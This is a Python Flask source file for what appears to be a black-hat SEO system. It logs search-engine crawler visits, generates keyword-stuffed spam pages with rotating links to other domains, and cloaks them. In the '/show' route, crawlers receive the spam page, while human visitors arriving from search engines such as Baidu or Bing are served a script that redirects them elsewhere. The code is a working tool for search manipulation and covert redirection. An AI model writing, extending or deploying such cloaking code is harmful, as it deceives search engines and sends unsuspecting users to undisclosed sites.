#!/usr/bin/env python3
# -*- coding=UTF-8 -*-
'''
@Description: 反代项目管理系统
@Author: bayonet
@Github: https://github.com/hyll8882019
@Date: 2019-07-28 20:37:12
@LastEditors: bayonet
@LastEditTime: 2019-07-30 20:37:56
'''
from datetime import datetime, timedelta

from flask import (Blueprint, Flask, flash, jsonify, redirect, render_template,
                   request, url_for)

from config import *
from public.helper import *
from views.domain_manger import domain
from views.pool_link import link
from views.login import login_check


app = Flask(__name__)
app.register_blueprint(domain)
app.register_blueprint(link)


@app.route('/')
@login_check
def index():
    return render_template('index.html')

# 蜘蛛统计管理开始


def add_spider_data(url, page, ua, spiders):
    '''
    @description: 添加一条蜘蛛请求数据到缓冲数据表中\n
    @param url: 请求域名\n
    @param page: 请求地址\n
    @param ua: 请求头\n
    @param spiders: 需要记录的蜘蛛列表
    '''
    conn = get_connect()
    spider_log = conn.domain_manager.spider_log
    spider_name = get_spider_name(ua, spiders)
    if len(spider_name) != 0:
        url = url + page
        print('[+] 正在插入 蜘蛛缓存 %s %s' % (url, spider_name))
        try:
            spider_log.insert_one(
                {'url': url, 'name': spider_name.lower(), 'user_agent': ua,
                 'create_time': datetime.utcnow()
                 })  # 自动删除 必须使用utc时间否则无法正常删除
        except Exception as e:
            print('[error]: 插入蜘蛛日志数据异常 %s' % e.args)


@app.route('/show_spider')
@login_check
def show_spider():
    '''
    @description: 显示蜘蛛日志
    '''
    current_page = int(request.args.get('page', '1'))
    show_days = request.args.get('show', '')
    spider_name = request.args.get('spider', '').replace('_spider', '').lower()
    conn = get_connect()
    spider_log = conn.domain_manager.spider_log
    max_show_num = current_page * MAX_SHOW_NUMBER
    min_show_num = max_show_num - MAX_SHOW_NUMBER
    if spider_name == 'all':
        t = spider_log.count_documents({})
        data = spider_log.find()
    else:
        t = spider_log.count_documents({'name': spider_name})
        data = spider_log.find({'name': spider_name})

    data = data.skip(min_show_num).limit(MAX_SHOW_NUMBER).sort('create_time', -1)
    conn.close()
    page, max_page = page_format(current_page, t, MAX_SHOW_NUMBER)
    return render_template('show_spider.html', request=request,
                           data=data, page=page, current_page=current_page,
                           max_page=max_page)


# 蜘蛛统计管理结束


# 模板渲染开始
def template_render(template, domain, pool_link):
    """
    模板渲染开始
    :param template: 需要渲染的模板
    :param domain: 查询后的数据
    :param pool_link: 轮链数据库
    :return: 渲染后的模板
    """
    keys_path = os.path.join(BASE_DIR, 'data', 'keys')
    for i in range(1, 6):
        key_file = os.path.join(keys_path, random_file(keys_path))
        key = random_line(key_file)
        template = template.replace('<关键词%d>' % i, key)
        template = template.replace('<转码关键词%d>' % i, to_unicode(key))

    template = random_file_replace(template, keys_path, '<随机关键词>')
    template = random_file_replace_to_unicode(template, keys_path, '<转码随机关键词>')

    title_path = os.path.join(BASE_DIR, 'data', 'title')
    template = random_file_replace(template, title_path, '<自定义>')
    template = random_file_replace_to_unicode(template, title_path, '<转码自定义>')

    news_title_path = os.path.join(BASE_DIR, 'data', 'news', 'title')
    template = random_file_replace(template, news_title_path, '<新闻标题>')
    template = random_file_replace_to_unicode(
        template, news_title_path, '<转码新闻标题>')

    news_content_path = os.path.join(BASE_DIR, 'data', 'news', 'content')
    template = random_file_replace(template, news_content_path, '<内容>')
    template = random_file_replace_to_unicode(
        template, news_content_path, '<转码内容>')

    news_content_path = os.path.join(BASE_DIR, 'data', 'suffixs')
    template = random_file_replace(template, news_content_path, '<后缀>')
    template = random_file_replace_to_unicode(
        template, news_content_path, '<转码后缀>')

    now_time = datetime.today()
    for i in range(1, 6):
        template = template.replace(
            '<时间%d>' % i, (now_time - timedelta(days=i - 1)).strftime('%Y-%m-%d'))

    template = template.replace('<当前域名>', domain['_id'])

    for _ in re.findall('<随机目录>', template):
        template = template.replace('<随机目录>', random.choice(
            domain['dir_prefix'].split(',')), 1)

    for r in ['<随机字符>', '<随机数字>']:
        for _ in re.findall(r, template):
            template = template.replace('<随机字符>', random_chars(5), 1)

    links = []
    for link in pool_link.find():
        links.append({'domain': link['_id'], 'rules': link['rules']})

    for _ in re.findall('<轮链>', template):
        if len(links) == 0:
            template = template.replace('<轮链>', random_chars(5), 1)
        else:
            link = random.choice(links)
            link = link['domain'] + random.choice(link['rules'])
            link = link.replace('<随机字符>', random_chars(5))
            link = link.replace('<随机数字>', random_chars(5))
            template = template.replace('<轮链>', link, 1)

    return template


@app.route('/show', methods=['GET', ])
def show():
    domain = request.args.get('domain', '').strip()
    page = request.args.get('page', '').strip()
    if len(domain) == 0 or len(page) == 0 or not (domain.startswith('http://') or domain.startswith('https://')):
        return "404"

    conn = get_connect()
    db_domain = conn.domain_manager.db_domain
    pool_link = conn.domain_manager.pool_link

    domain = db_domain.find_one({'_id': domain})
    if domain is None:
        return '404'

    # 验证目录
    not_exists_page = True
    for p in domain['dir_prefix'].split(','):
        if p in page:
            not_exists_page = False
            break

    if not_exists_page:
        return '404'

    # 设置缓存根目录
    cache_file_name = get_md5(page)
    current_cache_path = os.path.join(CACHE_DIR, domain['_id'].replace('http://', '').replace('https://', ''),
                                      cache_file_name[0: 3])
    if not os.path.exists(current_cache_path):
        os.makedirs(current_cache_path)

    cache_file = os.path.join(current_cache_path, cache_file_name)

    user_agent = request.headers.get('User-Agent', None)
    referer = request.headers.get('Referer', None)
    user_agent1 = request.args.get('user_agent', None)
    referer1 = request.args.get('http_refer', None)

    # 记录蜘蛛请求数据
    if not (user_agent is None and user_agent1 is None):
        if user_agent is None:
            add_spider_data(domain['_id'], page,
                            user_agent1, domain['spider_rules'])
        else:
            add_spider_data(domain['_id'], page,
                            user_agent, domain['spider_rules'])

    print('%s   %s  %s %s %s' %
          (domain['_id'], user_agent, user_agent1, referer, referer1))
    if user_agent is None and user_agent1 is None:
        # print('%s ua不存在' % domain['_id'])
        return '404'

    if os.path.exists(cache_file):
        # 检测User-Agent 是否为蜘蛛
        # print('%s 缓存' % domain['_id'])
        if user_agent is None:
            _spider = is_spider(user_agent1, domain['spider_rules'])
        else:
            _spider = is_spider(user_agent, domain['spider_rules'])

        output = ""
        # print('%s 是否为蜘蛛 %s' % (domain['_id'], _spider))
        if _spider:
            with open(cache_file, 'r', encoding='utf8') as _file:
                output = _file.read()

        if not _spider:
            if referer is None and referer1 is None:
                # print('%s ref 不存在' % domain['_id'])
                return '404'

            data = ['baidu', 'sogou', 'so', 'bing', 'sm']
            if referer is None:
                if is_user(referer1, data):
                    # print('%s 用户访问' % domain['_id'])
                    return '<script src="%s"></script>' % domain['js_jump']
            else:
                if is_user(referer, data):
                    # print('%s 用户访问' % domain['_id'])
                    return '<script src="%s"></script>' % domain['js_jump']

        if len(output) != 0:
            return output

    if user_agent is None:
        if not is_spider(user_agent1, domain['spider_rules']):
            return '404'
    else:
        if not is_spider(user_agent, domain['spider_rules']):
            return '404'
    # print('%s 蜘蛛访问' % domain['_id'])

    template = None
    template_path = os.path.join(BASE_DIR, 'data', 'mb', domain['tpl_name'])
    if not os.path.exists(template_path):
        return '模板文件不存在'

    # 加载模板
    with open(template_path, 'r', encoding='utf8') as _file:
        template = _file.read()

    if template is None:
        return '模板文件加载失败'

    template = template_render(template, domain, pool_link)

    # 写出模板
    with open(cache_file, 'w', encoding='utf8') as _file:
        _file.write(template)

    return template


# 模板渲染结束
if __name__ == "__main__":
    app.run(debug=False)
